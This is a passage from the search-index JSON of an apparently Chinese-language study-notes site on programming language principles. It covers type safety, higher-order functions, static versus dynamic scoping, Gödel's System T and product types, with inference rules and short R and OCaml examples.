\u8bed\u8a00\u7684\u4e0a\u4e0b\u6587\u52a8\u6001\u8bed\u4e49\u53ea\u6709\u5355\u6761\u89c4\u5219\u5b9a\u4e49\uff1a\\(\\dfrac{e=\\mathcal{E}\\{e_0\\}\\quad e_0\\rightarrow e_0'\\quad e'=\\mathcal{E}\\{e_0'\\}}{e\\mapsto e'}\\)</li> </ul>"},{"location":"cs/pl/ppl/topic3/#_7","title":"\u7c7b\u578b\u5b89\u5168","text":"<ul> <li>\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u4e2a\u6027\u8d28\u7684\u8bed\u8a00\u662f\u7c7b\u578b\u5b89\u5168\uff08type safe\uff09\u7684\uff1a<ul> <li>\u4fdd\u6301\u6027\uff08preservation\uff09\uff1a\u5982\u679c \\(e:\\tau\\) \u4e14 \\(e\\mapsto e'\\) \u90a3\u4e48 \\(e':\\tau\\)</li> <li>\u8fdb\u5c55\u6027\uff08progress\uff09\uff1a\u5982\u679c \\(e:\\tau\\)\uff0c\u5219\u8981\u4e48 \\(e\\text{ val}\\) \u8981\u4e48\u5b58\u5728 \\(e'\\) s.t. \\(e\\mapsto e'\\)</li> </ul> </li> <li>\u8fd0\u884c\u65f6\u9519\u8bef\uff0c\u4ee5\u9664\u4ee5 0 \u4e3a\u4f8b<ul> <li>\u7ed9 E \u8bed\u8a00\u52a0\u4e0a\u9664\u6cd5\u8fd0\u7b97 \\(\\dfrac{e_1:\\mathrm{num}\\quad e_2:\\mathrm{num}}{\\mathrm{div}(e_1; e_2):\\mathrm{num}}\\)</li> <li>\u5982\u679c\u9664\u4ee5\u96f6\u4e86\u5219\u4f1a stuck\uff0c\u4e24\u79cd\u89e3\u51b3\u601d\u8def\uff1a<ol> <li>\u589e\u5f3a\u7c7b\u578b\u7cfb\u7edf\uff0c\u4f7f\u5f97\u9664\u4ee5 0 \u7684\u60c5\u51b5\u4e0d\u4f1a\u51fa\u73b0\uff08\u6bd4\u8f83\u56f0\u96be\uff0c\u96be\u4ee5\u9759\u6001\u5b9e\u73b0\uff09</li> <li>\u589e\u52a0\u52a8\u6001\u68c0\u67e5\uff0c\u4f7f\u5f97\u9664\u4ee5 0 \u65f6\u62a5\u9519\u5e76\u5c06\u9519\u8bef\u4f5c\u4e3a\u6c42\u503c\u8f93\u51fa</li> </ol> </li> <li>\u91c7\u7528\u7b2c\u4e8c\u79cd\uff0c\u5f15\u5165 \\(e\\text{ err}\\) \u5224\u65ad\u8868\u793a \\(e\\) \u4f1a\u5bfc\u81f4\u8fd0\u884c\u65f6\u9519\u8bef<ul> <li>\\(\\dfrac{e_1\\text{ val}}{\\mathrm{div}(e_1; \\mathrm{num}[0])\\text{ err}},\\ \\dfrac{e_1\\text{ err}}{\\mathrm{div}(e_1; e_2)\\text{ err}},\\ \\dfrac{e_1\\text{ val}\\quad e_2\\text{ err}}{\\mathrm{div}(e_1; e_2)\\text{ err}}\\)</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic4/","title":"\u51fd\u6570\u4e0e\u9012\u5f52","text":"<p> \u7ea6 2023 \u4e2a\u5b57  11 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u7b2c\u516b\u5468\u81f3\u7b2c\u4e5d\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/pl/ppl/topic4/#_2","title":"\u51fd\u6570","text":"<ul> <li>\u51fd\u6570\u5b9a\u4e49\uff1a\u5c06\u540d\u5b57\u7ed1\u5b9a\u5230\u5e26\u7ea6\u675f\u53d8\u91cf\u7684 abt \u6765\u5b9a\u4e49</li> <li>\u51fd\u6570\u5e94\u7528\uff1a\u7528\u5408\u9002\u7c7b\u578b\u7684\u7279\u5b9a\u8868\u8fbe\u5f0f\u6765\u66ff\u6362\u7ea6\u675f\u53d8\u91cf\u4ece\u800c\u5f97\u5230\u4e00\u4e2a\u8868\u8fbe\u5f0f</li> </ul>"},{"location":"cs/pl/ppl/topic4/#_3","title":"\u4e00\u9636\u51fd\u6570","text":"<ul> <li>\u6269\u5145\u5b9a\u4e49 ED \u8bed\u8a00\uff1a<ul> <li>\\(\\mathsf{Exp}\\ e::=\\mathrm{apply}\\{f\\}(e)\\) \u8868\u793a \\(f(e)\\)</li> <li>\\(\\mathsf{Exp}\\ e::=\\mathrm{fun}\\{\\tau_1; \\tau_2\\}(x_1.e_2; f.e)\\) \u8868\u793a \\(\\mathrm{fun}\\ f(x_1:\\tau_1):\\tau_2=e_2\\ \\mathrm{in}\\ e\\)<ul> <li>\u5c06 \\(e\\) \u4e2d\u51fd\u6570\u540d \\(f\\) \u7ed1\u5b9a\u5230\u6a21\u5f0f \\(x_1.e_2\\)\uff08\u5177\u6709\u53c2\u6570 \\(x_1\\) \u548c\u5b9a\u4e49 \\(e_2\\)\uff09</li> <li>\\(f(\\tau_1; \\tau_2)\\) \u548c \\(f(\\tau_1):\\tau_2\\) \u7b49\u4ef7\uff0c\u79f0\u4e3a\u51fd\u6570\u5934\uff0c\\(\\tau_1\\) \u662f\u53c2\u6570\u7c7b\u578b\uff0c\\(\\tau_2\\) \u662f\u8fd4\u56de\u503c\u7c7b\u578b</li> </ul> </li> </ul> </li> <li>\u51fd\u6570\u4ee3\u6362\uff0c\u8bb0\u4f5c \\([\\![x_1.e_2/f]\\!]e\\)<ul> <li>\\(\\dfrac{}{[\\![x_1.e_2/f]\\!]\\mathrm{apply}\\{f\\}(e_1)=\\mathrm{let}([\\![x_1.e_2/f]\\!]e_1; x_1.e_2)}\\)</li> <li>\u7406\u89e3\u4e3a\u65bd\u52a0\u51fd\u6570\u5e94\u7528\uff0c\u4ee4\u201c\u51fd\u6570\u4f53\u201d \\(e_2\\) \u4e2d\u7684\u53c2\u6570 \\(x_1\\) \u4e3a \\([\\![x_1.e_2/f]\\!]e_1\\)\uff0c\u5373\u7ecf\u8fc7\u4ee3\u6362\u540e\u7684\u53c2\u6570 \\(e_1\\)</li> </ul> </li> <li>\u52a8\u6001\u8bed\u4e49<ul> <li>\\(\\dfrac{}{\\mathrm{fun}\\{\\tau_1; \\tau_2\\}(x_1.e_2; f.e)\\mapsto [\\![x_1.e_2/f]\\!]e}\\)</li> <li>\\(e\\) \u4e2d\u51fd\u6570 \\(f\\) \u53c2\u6570\u662f \\(x_1\\) \u7ed3\u679c\u4e3a \\(e_2\\)\uff0c\u8fd9\u4e2a\u5b9a\u4e49\u7684\u8bed\u4e49\u5c31\u662f\u5728 \\(e\\) \u4e2d\u8fdb\u884c\u51fd\u6570\u4ee3\u6362</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic4/#_4","title":"\u9ad8\u9636\u51fd\u6570","text":"<ul> <li>\u6269\u5145\u5b9a\u4e49 EF \u8bed\u8a00\uff1a<ul> <li>\u51fd\u6570\u7c7b\u578b\uff1a\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{arr}(\\tau_1; \\tau_2)\\) \u8868\u793a\u4e00\u4e2a \\(\\tau_1\\rightarrow\\tau_2\\) \u7684\u51fd\u6570\u7c7b\u578b</li> <li>\u51fd\u6570\u62bd\u8c61\uff1a\\(\\mathsf{Exp}\\ e ::= \\mathrm{lam}\\{\\tau\\}(x.e)\\) \u8868\u793a\u4e00\u4e2a\u5e26\u7c7b\u578b\u7684 \u03bb \u51fd\u6570 \\(\\lambda(x:\\tau)e\\)\uff08\u51fd\u6570\u7c7b\u578b\u7684\u5f15\u5165\u5f62\u5f0f\uff09</li> <li>\u51fd\u6570\u5e94\u7528\uff1a\\(\\mathsf{Exp}\\ e ::= \\mathrm{ap}(e_1; e_2)\\) \u8868\u793a \\(e_1(e_2)\\)\uff08\u51fd\u6570\u7c7b\u578b\u7684\u6d88\u53bb\u5f62\u5f0f\uff09</li> </ul> </li> <li>\u51fd\u6570\u662f\u4e00\u7b49\u7684\uff0c\u53ef\u4ee5\u548c\u5176\u4ed6\u8868\u8fbe\u5f0f\u4e00\u6837\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u548c\u8fd4\u56de\u503c</li> <li>\u9759\u6001\u8bed\u4e49\uff1a\\(\\dfrac{\\Gamma, x:\\tau_1\\vdash e:\\tau_2}{\\Gamma\\vdash\\mathrm{lam}\\{\\tau_1\\}(x.e):\\mathrm{arr}(\\tau_1; \\tau_2)},\\ \\dfrac{\\Gamma\\vdash e_1:\\mathrm{arr}(\\tau_2; \\tau)\\quad\\Gamma\\vdash e_2:\\tau_2}{\\Gamma\\vdash \\mathrm{ap}(e_1; e_2):\\tau}\\)</li> <li>\u5f15\u7406 8.2\uff08\u53cd\u8f6c\uff0cinversion\uff09\uff1a\u5047\u8bbe \\(\\Gamma\\vdash e:\\tau\\)<ul> <li>\u5982\u679c \\(e=\\mathrm{lam}\\{\\tau_1\\}(x.e_2)\\) \u90a3\u4e48 \\(\\tau=\\mathrm{arr}(\\tau_1; \\tau_2)\\) \u4e14 \\(\\Gamma,x:\\tau_1\\vdash e_2:\\tau_2\\)</li> <li>\u5982\u679c \\(e=\\mathrm{ap}(e_1; e_2)\\) \u90a3\u4e48\u5b58\u5728 \\(\\tau_2\\) \u4f7f\u5f97 \\(\\Gamma\\vdash e_1:\\mathrm{arr}(\\tau_2; \\tau)\\) \u4e14 \\(\\Gamma\\vdash e_2:\\tau_2\\)</li> </ul> </li> <li>\u540c\u6837\u6210\u7acb\u7684\u65e7\u6027\u8d28\uff1a<ul> <li>\u5f15\u7406 8.3\uff08\u4ee3\u6362\uff0csubstitution\uff09\uff1a\u5982\u679c \\(\\Gamma, x:\\tau\\vdash e':\\tau'\\) \u4e14 \\(\\Gamma\\vdash e:\\tau\\)\uff0c\u90a3\u4e48 \\(\\Gamma\\vdash [e/x]e':\\tau'\\)</li> <li>\u5f15\u7406 8.4\uff08\u4fdd\u6301\u6027\uff0cpreservation\uff09\uff1a\u5982\u679c \\(e:\\tau\\) \u4e14 \\(e\\mapsto e'\\) \u90a3\u4e48 \\(e':\\tau\\)</li> <li>\u5f15\u7406 8.5\uff08\u8303\u5f0f\uff0ccanonical forms\uff09\uff1a\u5982\u679c \\(e:\\mathrm{arr}(\\tau_1; \\tau_2)\\) \u4e14 \\(e\\text{ val}\\) \u90a3\u4e48\u5bf9\u4e8e\u6ee1\u8db3 \\(x:\\tau_1\\vdash e_2:\\tau_2\\) \u7684\u53d8\u91cf \\(x\\) \u548c\u8868\u8fbe\u5f0f \\(e_2\\) \u6709 \\(e=\\lambda(x:\\tau_1)e_2\\)</li> <li>\u5f15\u7406 8.6\uff08\u8fdb\u5c55\u6027\uff0cprogress\uff09\uff1a\u5982\u679c \\(e:\\tau\\) \u5219\u8981\u4e48 \\(e\\text{ val}\\) \u8981\u4e48\u5b58\u5728 \\(e'\\) \u4f7f\u5f97 \\(e\\mapsto e'\\)</li> </ul> </li> <li>\u52a8\u6001\u8bed\u4e49<ul> <li>\\(\\dfrac{e_1\\mapsto e_1'}{\\mathrm{ap}(e_1; e_2)\\mapsto\\mathrm{ap}(e_1'; e_2)}\\)</li> <li>\\(\\left[\\dfrac{e_1\\text{ val}\\quad e_2\\mapsto e_2'}{\\mathrm{ap}(e_1; e_2)\\mapsto\\mathrm{ap}(e_1; e_2')}\\right]\\)\uff08\u5982\u679c\u662f lazy \u8ba1\u7b97\u5219\u4e0d\u9700\u8981\u8fd9\u4e2a\uff09</li> <li>\\(\\dfrac{[e_2\\text{ val}]}{\\mathrm{ap}(\\mathrm{lam}\\{\\tau\\}(x.e); e_2)\\mapsto [e_2/x]e}\\)\uff08\u540c\u6837\uff0c\u5982\u679c\u662f lazy \u5219\u4e0d\u9700\u8981\u5206\u5b50\u65b9\u62ec\u53f7\u4e2d\u5185\u5bb9\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic4/#_5","title":"\u52a8\u6001\u4f5c\u7528\u57df","text":"<p>\u6bd4\u5982\u8003\u8651\u5982\u4e0b\u4ee3\u7801\uff0c\u8be5\u8f93\u51fa\u4ec0\u4e48\uff081 \u8fd8\u662f 2\uff09\uff1a</p> <pre><code>x &lt;- 1\nf &lt;- function(a) x + a\ng &lt;- function() {\n    x &lt;- 2\n    f(0)\n}\ng()\n</code></pre> <ul> <li>\u9759\u6001\u4f5c\u7528\u57df\uff08static scoping\uff09\u53c8\u79f0\u4e3a\u8bcd\u6cd5\u4f5c\u7528\u57df\uff08lexical scoping\uff09\uff0c\u6839\u636e\u7a0b\u5e8f\u7684\u8bcd\u6cd5\u7ed3\u6784\u5c31\u51b3\u5b9a<ul> <li>\u5927\u90e8\u5206\u7f16\u7a0b\u8bed\u8a00\u90fd\u662f\u9759\u6001\u4f5c\u7528\u57df\u7684</li> <li>\u51fd\u6570\u8bbf\u95ee\u7684\u59cb\u7ec8\u662f\u88ab\u521b\u5efa\uff08\u58f0\u660e\uff09\u5904\u7684\u53d8\u91cf</li> <li>\u5982\u4e0a\u7684\u4f8b\u5b50\u4e2d\u9759\u6001\u4f5c\u7528\u57df\u4f1a\u8f93\u51fa 1</li> </ul> </li> <li>\u52a8\u6001\u4f5c\u7528\u57df\uff08dynamic scoping\uff09\uff0c\u5728\u8fd0\u884c\u65f6\u786e\u5b9a<ul> <li>\u51fd\u6570\u8bbf\u95ee\u7684\u662f\u8c03\u7528\u7684\u4f4d\u7f6e\u6216\u8005\u8bf4\u6267\u884c\u5230\u5f53\u524d\u4f4d\u7f6e\u65f6\u7684\u201c\u73af\u5883\u201d\u4e2d\u7684\u53d8\u91cf</li> <li>\u5982\u4e0a\u7684\u4f8b\u5b50\u4e2d\u52a8\u6001\u4f5c\u7528\u57df\u4f1a\u8f93\u51fa 2</li> </ul> </li> <li>\u4e66\u4e0a\u7684\u4f8b\u5b50\uff1a\u5728\u7528\u5230\u9ad8\u9636\u51fd\u6570\u65f6\u4f1a\u51fa\u73b0\u533a\u522b<ul> <li>\u8003\u8651\u51fd\u6570 \\(e := (\\lambda(x:\\mathrm{num}).\\ (\\lambda(y:\\mathrm{num}).\\ (x+y)))(42)\\)<ul> <li>\u9759\u6001\u4f5c\u7528\u57df\u6839\u636e abt \u8fdb\u884c\u4ee3\u6362\uff0c\u5316\u4e3a \\(e=\\lambda(y:\\mathrm{num}).\\ 42+y\\)</li> <li>\u52a8\u6001\u4f5c\u7528\u57df\u4e0b\u4f1a\u5f97\u5230\u5f00\u9879 \\(e=\\lambda(y:\\mathrm{num}).\\ x+y\\)<ul> <li>\u53d8\u91cf\u7ed1\u5b9a\u5c3d\u91cf\u665a\u7684\u786e\u5b9a\uff0c\u6839\u636e\u6c42\u503c\u65f6\u7684\u73af\u5883\u51b3\u5b9a\uff0c\u6240\u4ee5\u6b64\u65f6\u8fd8\u4e0d\u9700\u8981 \\(x\\)\uff0c\u5b83\u662f\u81ea\u7531\u7684</li> </ul> </li> </ul> </li> <li>\u518d\u8ba1\u7b97 \\(\\Big(\\lambda(f:\\mathrm{num}\\rightarrow\\mathrm{num}).\\ \\big(\\lambda(x:\\mathrm{num}).\\ f(0)\\big)\\big(7\\big)\\Big)\\Big(e\\Big)\\)<ul> <li>\u9759\u6001\u4f5c\u7528\u57df\u6c42\u503c\u4e0b\u5c06 \\(f\\) \u4ee3\u6362\u4e3a \\(e\\)\uff0c\u8fd9\u6837 \\(f(0)\\) \u5f97\u5230\u4e86 42 \u7136\u540e\u6b64\u65f6 \\((\\lambda(x:\\mathrm{num}).\\ 42)(7)\\) \u7684\u503c\u4ecd\u4e3a 42</li> <li>\u52a8\u6001\u4f5c\u7528\u57df\u6c42\u503c\u4e0b\u6700\u7ec8 \\(x=0, y=7\\) \u6240\u4ee5\u7ed3\u679c\u4e3a 7</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic4/#_6","title":"\u9ad8\u9636\u9012\u5f52\u7cfb\u7edf","text":""},{"location":"cs/pl/ppl/topic4/#_7","title":"\u8865\u5145\u77e5\u8bc6","text":"<ul> <li>\u51fd\u6570 \\(f\\ A\\rightarrow B\\)\uff0c\u662f\u4e00\u79cd\u96c6\u5408\u7684\u6620\u5c04\u5173\u7cfb</li> <li>\u90e8\u5206\u51fd\u6570\uff08partial function\uff09\uff1a\\(\\forall a\\in A\\) \u6709 \\(f(a)=\\emptyset\\) \u6216 \\(b\\)\uff0c\u5f53 \\(f(a)=b\\) \u65f6\u8bb0\u4f5c \\(f(a)\\downarrow\\)</li> <li>\u5168\u51fd\u6570\uff08total function\uff09\uff1a\\(\\forall a\\in A\\) \u90fd\u6709 \\(f(a)\\downarrow\\)\uff0c\u53ef\u8bb0\u4e3a \\(f:A\\rightarrow B\\)</li> <li>\u975e\u7ec8\u6b62\u6027\uff0c\u6709\u4e9b\u60c5\u51b5\u4e0b\u51fd\u6570\u8ba1\u7b97\u4f1a\u65e0\u9650\u9012\u5f52\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c31\u662f\u975e\u7ec8\u6b62\u7684<ul> <li>\u52a0\u4e0a\u4e00\u4e2a\u7279\u6b8a\u5143\u7d20 \\(\\bot\\) \u8868\u793a\u975e\u7ec8\u6b62</li> <li>\u4e25\u683c\u7684\uff08strict\uff09\uff1a\u5982\u679c\u63a5\u53d7\u4e00\u4e2a\u975e\u7ec8\u6b62\u7684\u8f93\u5165\uff0c\u8ba1\u7b97\u4ecd\u7136\u4e0d\u4f1a\u7ec8\u6b62\uff0c\u5373 \\(f(\\bot)=\\bot\\)\uff1b\u5426\u5219\u79f0\u4e4b\u4e3a\u4e0d\u4e25\u683c\u7684\uff08non-strict\uff09</li> </ul> </li> <li>\u5b9a\u4e49\u4e24\u79cd\u8fd0\u7b97\uff1a<ul> <li>\u5408\u6210\u8fd0\u7b97\uff1a\u4ee4 \\(h(x_1, \\cdots, x_n) = f(g_1(x_1, \\cdots, x_n), \\cdots, g_k(x_1, \\cdots, x_n))\\)\uff0c\u79f0 \\(h\\) \u662f\u7531 \\(f\\) \u548c \\(g_1,\\cdots g_k\\) \u7ecf\u8fc7\u5408\u6210\u8fd0\u7b97\u5f97\u5230\u7684<ul> <li>\u5176\u4e2d \\(f\\) \u548c \\(g_i\\) \u90fd\u662f\u90e8\u5206\u51fd\u6570</li> </ul> </li> <li>\u539f\u59cb\u9012\u5f52\u8fd0\u7b97\uff1a<ul> <li>\u8bbe \\(f\\) \u662f \\(n\\) \u5143\u5168\u51fd\u6570\uff0c\\(g\\) \u662f \\(n+2\\) \u5143\u5168\u51fd\u6570</li> <li>\u4ee4 \\(h(x_1, \\cdots, x_n, 0) = f(x_1, \\cdots, x_n)\\)</li> <li>\u4ee4 \\(h(x_1, \\cdots, x_n, t+1) = g(t, h(x_1, \\cdots, x_n, t), x_1, \\cdots, x_n)\\)</li> <li>\u79f0 \\(h\\) \u662f\u7531 \\(f\\) \u548c \\(g\\) \u7ecf\u8fc7\u539f\u59cb\u9012\u5f52\u8fd0\u7b97\u5f97\u5230\u7684</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic4/#godels-system-t","title":"G\u00f6del's System T","text":"<ul> <li>\u4ee5 \\(\\mathrm{nat}\\) \u4e3a\u7c7b\u578b\u7684\u8bed\u8a00 T\uff0c\u8bed\u6cd5\uff1a<ul> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{nat}\\) \u81ea\u7136\u6570\u7c7b\u578b / \\(\\mathrm{arr}(\\tau_1; \\tau_2)\\) \u51fd\u6570\u7c7b\u578b</li> <li>\\(\\mathsf{Exp}\\ e ::= x\\) \u53d8\u91cf / \\(\\mathrm{z}\\) \u96f6 / \\(\\mathrm{s}(e)\\) \u540e\u7ee7<ul> <li>Church \u81ea\u7136\u6570\u5b9a\u4e49\uff0c\\(\\overline{n}\\) \u8868\u793a \\(s(\\cdots s(z))\\) \u4f5c\u7528 \\(n\\) \u6b21</li> </ul> </li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{lam}\\{\\tau\\}(x.e)\\) \u51fd\u6570\u62bd\u8c61\uff08\u53c2\u6570\u4e3a \\(\\tau\\) \u7c7b\u578b\u7684 \\(x\\)\uff0c\u8fd4\u56de\u503c\u4e3a \\(e\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{ap}(e_1; e_2)\\) \u51fd\u6570\u5e94\u7528</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{rec}\\{e_0; x.y.e_1\\}(e)\\) \u9012\u5f52<ul> <li>\\(x.y.e_1\\) \u8868\u793a \\(e_1\\) \u6709\u4e24\u4e2a\u7ed1\u5b9a\u53d8\u91cf \\(x\\) \u548c \\(y\\)</li> <li>\\(\\mathrm{rec}\\{e_0; x.y.e_1\\}(e)\\) \u8868\u793a<ul> <li>\\(e\\) \u4e3a 0 \u65f6\u8fd4\u56de \\(e_0\\)</li> <li>\\(e\\) \u4e3a \\(\\mathrm{s}(n)\\) \u65f6\u8fd4\u56de \\(e_1(n, \\mathrm{rec}\\{e_0; x.y.e_1\\}(n))\\)</li> </ul> </li> <li>*\u4e66\u4e0a\u7684\u62bd\u8c61\u63cf\u8ff0 \\(\\mathrm{rec}\\ e\\{\\mathrm{z}\\hookrightarrow e_0\\ |\\ \\mathrm{s}(x)\\text{ with }y\\hookrightarrow e_1\\}\\)<ul> <li>\u5927\u62ec\u53f7\u91cc\u5e26 | \u76f8\u5f53\u4e8e switch\uff0c\u5224\u65ad \\(e\\) \u7684\u503c\u662f \\(\\mathrm{z}\\) \u8fd8\u662f \\(\\mathrm{s}(x)\\)</li> <li>\\(\\hookrightarrow\\) \u79f0\u4e3a lead to\uff0c\u8868\u793a\u5982\u679c\u662f\u5de6\u4fa7\uff0c\u5219\u7ed3\u679c\u662f\u53f3\u4fa7</li> <li>\\(\\mathrm{s}(x)\\text{ with }y\\) \u662f\u4e00\u4e2a\u6574\u4f53\uff0c\u8868\u793a\u5339\u914d\u5230 \\(x,y\\) \u4f5c\u4e3a \\(e_1\\) \u7684\u7ed1\u5b9a\u53d8\u91cf</li> </ul> </li> </ul> </li> </ul> </li> <li>\u9759\u6001\u8bed\u4e49\uff0c\u5927\u90e8\u5206\u90fd\u548c\u4e4b\u524d\u5dee\u4e0d\u591a<ul> <li>\u9012\u5f52\uff1a\\(\\dfrac{\\Gamma\\vdash e:\\mathrm{nat}\\quad\\Gamma\\vdash e_0:\\tau\\quad\\Gamma, x:\\mathrm{nat}, y:\\tau\\vdash e_1:\\tau}{\\Gamma\\vdash\\mathrm{rec}\\{e_0; x.y.e_1\\}(e):\\tau}\\)</li> </ul> </li> <li>\u52a8\u6001\u8bed\u4e49<ul> <li>\u95ed\u503c\uff1a\\(\\dfrac{}{\\mathrm{z}\\text{ val}},\\ \\dfrac{[e\\text{ val}]}{\\mathrm{s}(e)\\text{ val}},\\ \\dfrac{}{\\mathrm{lam}\\{\\tau\\}(x.e)\\text{ val}}\\)<ul> <li>\u5176\u4e2d\u65b9\u62ec\u53f7\u8868\u793a\u5982\u679c\u662f eager \u8ba1\u7b97\u5219\u9700\u8981\uff0c\u5982\u679c\u662f lazy \u5219\u4e0d\u9700\u8981</li> </ul> </li> <li>\u9012\u5f52\u76f8\u5173\u52a8\u6001\u8bed\u4e49\u8f6c\u6362\u89c4\u5219\uff1a<ul> <li>\\(\\dfrac{e\\mapsto e'}{\\mathrm{rec}\\{e_0; x.y.e_1\\}(e)\\mapsto\\mathrm{rec}\\{e_0; x.y.e_1\\}(e')}\\)</li> <li>\\(\\dfrac{}{\\mathrm{rec}\\{e_0; x.y.e_1\\}(\\mathrm{z})\\mapsto e_0}\\)</li> <li>\\(\\dfrac{\\mathrm{s}(e)\\text{ val}}{\\mathrm{rec}\\{e_0; x.y.e_1\\}(\\mathrm{s}(e))\\mapsto [e,\\mathrm{rec}\\{e_0; x.y.e_1\\}(e)/x,y]e_1}\\)</li> </ul> </li> </ul> </li> <li>\u540c\u65f6\u6709\u4e4b\u524d\u7684\u5f15\u7406\u6210\u7acb\uff0c\u5305\u62ec\u5b89\u5168\u6027\uff08\u4fdd\u6301\u6027\u548c\u8fdb\u5c55\u6027\u540c\u65f6\u6210\u7acb\uff09</li> </ul> OCaml \u4e2d\u5229\u7528 System T \u5b9a\u4e49\u52a0\u500d\u51fd\u6570 <pre><code>type nat = Z | S of nat;;\nlet rec double a = match a with\n    | Z -&gt; Z\n    | S x -&gt; let y = double x in S (S y);;\n</code></pre> <p>\u5199\u6210 T \u8bed\u8a00\u7684\u5f62\u5f0f\u5c31\u662f \\(\\lambda\\{\\mathrm{nat}\\}(e.\\mathrm{rec}\\{\\mathrm{z}; x.y.\\mathrm{s}(\\mathrm{s}(y))\\}(e))\\)</p> <ul> <li>\u8fd9\u91cc\u7ed1\u5b9a\u53d8\u91cf \\(x\\) \u5b9e\u9645\u6ca1\u6709\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u8fed\u4ee3\u5f0f\u6765\u66ff\u6362\uff0c\u5373 \\(\\mathrm{iter}\\{e_0, y.e_1\\}(e)\\)\uff08\u5c31\u662f\u628a \\(x\\) \u5220\u4e86\uff09</li> </ul>"},{"location":"cs/pl/ppl/topic4/#_8","title":"\u53ef\u5b9a\u4e49\u6027","text":"<ul> <li>\\(f:\\mathbb{N}\\rightarrow\\mathbb{N}\\) \u662f\u53ef\u5b9a\u4e49\u7684 &lt;=&gt; \u5b58\u5728\u4e00\u4e2a \\(\\mathrm{nat}\\rightarrow\\mathrm{nat}\\) \u7684\u8868\u8fbe\u5f0f \\(e_f\\)\uff0c\u4f7f\u5f97\u5f53\u5e94\u7528\u4e8e\u8868\u793a\u53c2\u6570 \\(n\\in\\mathbb{N}\\) \u65f6\uff0c\u51fd\u6570\u5e94\u7528\u5728\u5b9a\u4e49\u4e0a\u7b49\u4e8e \\(f(n)\\in\\mathbb{N}\\) \u6240\u5bf9\u5e94\u7684\u6570<ul> <li>\\(e_f(\\overline{n})\\equiv\\overline{f(n)}:\\mathrm{nat}\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic5/","title":"\u6570\u636e\u7c7b\u578b","text":"<p> \u7ea6 2206 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u7b2c\u5341\u5468\u81f3\u7b2c\u5341\u4e09\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/pl/ppl/topic5/#_2","title":"\u6709\u9650\u6570\u636e\u7c7b\u578b","text":""},{"location":"cs/pl/ppl/topic5/#_3","title":"\u79ef\u7c7b\u578b","text":"<ul> <li>\u4e8c\u5143\u79ef\uff08binary product\uff09\uff1a\u503c\u7684\u6709\u5e8f\u5bf9\uff08ordered pairs\uff09\\(\\langle\\tau_1, \\tau_2\\rangle\\)<ul> <li>\u6d88\u53bb\u5f62\u5f0f\uff1a\u6295\u5f71\uff0c\u6790\u53d6\u5206\u91cf \\(\\langle\\tau_1, \\tau_2\\rangle\\cdot l = \\tau_1\\)</li> <li>\u60f0\u6027\uff08lazy\uff09\u52a8\u6001\u8bed\u4e49\uff1a\u65e0\u8bba\u5206\u91cf\u662f\u5426\u6709\u503c\uff0c\u6709\u5e8f\u5bf9\u90fd\u662f\u503c</li> <li>\u6025\u6027\uff08eager\uff09\u52a8\u6001\u8bed\u4e49\uff1a\u5206\u91cf\u90fd\u662f\u503c\u7684\u65f6\u5019\uff0c\u6709\u5e8f\u5bf9\u624d\u662f\u503c</li> </ul> </li> <li>\u7a7a\u79ef\uff08nullary product\uff09\uff1a\u4e0d\u5305\u542b\u4efb\u4f55\u503c\u7684\u7a7a\u5143\u7ec4\uff0c\u6ca1\u6709\u6d88\u53bb\u5f62\u5f0f</li> <li>\u6709\u9650\u79ef\uff08infinite product\uff09\uff1a\\(\\langle\\tau_i\\rangle_{i\\in I}\\)\uff08\\(I\\) \u662f\u7d22\u5f15\u7684\u6709\u9650\u96c6\uff09</li> <li>\u7a7a\u79ef\u4e0e\u4e8c\u5143\u79ef\u7684\u8bed\u6cd5\u548c\u8bed\u4e49<ul> <li>\u5b9a\u4e49\u8bed\u6cd5<ul> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{unit}\\) \u7a7a\u79ef / \\(\\mathrm{prod}(\\tau_1; \\tau_2)\\) \u4e8c\u5143\u79ef \\(\\tau_1\\times\\tau_2\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{triv}\\) \u7a7a\u5143\u7ec4 / \\(\\mathrm{pair}(e_1; e_2)\\) \u6709\u5e8f\u5bf9 \\(\\langle e_1, e_2\\rangle\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{pr[l]}(e)\\) \u5de6\u6295\u5f71 / \\(\\mathrm{pr[r]}(e)\\) \u53f3\u6295\u5f71</li> </ul> </li> <li>\u9759\u6001\u8bed\u4e49\u5f88\u76f4\u63a5\uff0c\u5ffd\u7565</li> <li>\u52a8\u6001\u8bed\u4e49\uff1a<ul> <li>\\(\\dfrac{}{\\langle\\rangle\\text{ val}},\\ \\dfrac{[e_1\\text{ val}]\\quad [e_2\\text{ val}]}{\\langle e_1, e_2\\rangle\\text{ val}}\\)</li> <li>\\(\\left[\\dfrac{e_1\\mapsto e_1'}{\\langle e_1, e_2\\rangle\\mapsto\\langle e_1', e_2\\rangle}\\right],\\ \\left[\\dfrac{e_1\\text{ val}\\quad e_2\\mapsto e_2'}{\\langle e_1, e_2\\rangle\\mapsto\\langle e_1, e_2'\\rangle}\\right]\\)</li> <li>\\(\\dfrac{e\\mapsto e'}{e\\cdot l\\mapsto e'\\cdot 